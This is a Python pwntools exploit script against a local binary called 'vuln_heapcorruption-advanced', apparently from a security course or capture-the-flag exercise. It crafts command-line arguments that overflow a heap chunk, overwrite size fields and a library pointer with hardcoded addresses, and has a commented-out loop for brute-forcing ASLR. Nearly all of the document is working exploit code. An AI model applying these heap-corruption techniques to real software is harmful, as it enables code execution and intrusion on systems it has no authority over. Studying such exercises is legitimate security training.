#!/usr/bin/env python
# -*- coding: utf-8 -*-
from itertools import count

from pwn import *
exe = context.binary = ELF('vuln_heapcorruption-advanced')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
break main
continue
break 100
break 123
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# offsets to the ni heap chunk
# only used as information, where which variable is stored
# not used in the code
# not complete
OFFSET = {
    'NI_CHUNK': 0,
    'NI_SIZE': 4,
    'NI_LIB_POINTER': 32,
    'NI_NAME': 40,
    'LIB_CHUNK': 48,
    'LIB_SIZE': 48+4,
    'LIB_NAME': 48+8,
    'LIB_HANDLE': 48+12,
}

"""desired overflow contents:
set NI_SIZE = 0x00000031
set NI_LIB_POINTER = SOMEWHERE-4
set SOMWHERE = '\x00\x00\x00\x00' <- I've chosen ni.actions[1] for this
set NI_NAME = 'X/X\x00'
set LIB_SIZE = 0x00000011
"""


# depends on input size
# OFFFSET_USER_ARGS = user_args chunk size - 9 (see heap; something like 0x81)
OFFFSET_USER_ARGS = -120

# TODO: this seems to be not true for the heap, memory layout is changed when upgrading from MEDIUM to ADVANCED, but no ALSR afaik
# this is NOT correct for general ASLR
# but with some luck it is :)
# if modified, make sure it's passed as a single argument by checking argv (ie no spaces/...)
NAME_ADDRESS = 0x5655a1f0
LIBRARY_POINTER = p32(NAME_ADDRESS - 1)

# \ aaa
# results in
# \x00 + aaa + ' ' + aaa + ' '
# OFFFSET_USER_ARGS = 2*a + 3
random_chars_n = (abs(OFFFSET_USER_ARGS)-3)/2
USER_ARGS_PADDING = ["'\\'", cyclic(int(random_chars_n))]
# add one char (' ') if we would need 0.5 A's (ie an odd number of outputted A's) 
if random_chars_n % 1 != 0:
    USER_ARGS_PADDING += ["''"]

argv = USER_ARGS_PADDING

# set NI_SIZE = 0x00000031
argv += [cyclic(3), "'" + chr(0x31) + "\\'", "'\\'", "'\\'", "''", "''"]
# 12 = len('\x31\x00\x00\x00 \x00\x00 \x00   ') (three spaces at the end)
# cur_offset: 16

# add NULL pointer
argv += ["'\\'", "'\\'", "'\\'", "'\\'", "''", "''"]
# 16 = len('\x00\x00\x00\x00 \x00\x00\x00 \x00\x00 \x00   ') (three spaces at the end)
# cur_offset: 32

# set NI_LIB_POINTER = SOMEWHERE-4 (set var ni.library = (int) ni + 4)
argv += [p32(0x56d711e4)]
argv += [cyclic(2)]
# cur_offset: 40

# set NI_NAME = 'X/X\x00'
argv += ["'X/X\\'", "''", "''", "''"]
# cur_offset: 48

# set LIB_SIZE = 0x00000011
argv += [cyclic(3), "'" + chr(0x11) + "\\'", "'\\'", "'\\'", "''", "''"]
# cur_offset: 60

io = start(argv)
io.wait_for_close()

"""
with log.progress('Brute-forceing ASLR') as p:
    for tries in count(start=1):
        io = start(argv, level=logging.ERROR)
        p.status(f'{tries} tries')
        success = b'Shared library loaded'
        if io.recvuntil(success):
            io.unrecv(success)
            break
        io.kill()
"""

while True:
    try:
        log.info(io.recvlineS())
    except EOFError:
        break
